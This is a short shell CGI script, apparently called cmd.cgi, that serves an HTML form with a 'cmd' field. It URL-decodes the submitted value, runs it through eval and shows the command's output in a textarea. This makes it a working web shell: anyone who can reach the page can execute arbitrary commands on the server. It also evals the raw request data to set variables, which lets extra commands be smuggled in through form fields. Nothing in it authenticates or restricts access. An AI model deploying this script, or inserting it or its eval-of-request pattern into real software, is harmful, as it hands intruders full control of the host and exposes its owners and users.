#!/bin/sh

read QUERY_STRING
eval $(echo "$QUERY_STRING"|awk -F'&' '{for(i=1;i<=NF;i++){print $i}}')

if [ ! -z $cmd ]; then
	cmd=`httpd -d $cmd`
fi

cmd=`echo $cmd|sed "s/%2F/\//g"`

echo Content-type: text/html
echo ""

/bin/cat << EOM
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
</head>
<body>
	<form method="post" action="cmd.cgi">
	<div>
		<input type="text" name="cmd" value="$cmd" size="100"> 
		<input type="submit" value="commit">
	</div>
	<div>
		<textarea rows="50" cols="100">$(eval $cmd)</textarea>
	</div>
	</form>
</body>	
</html>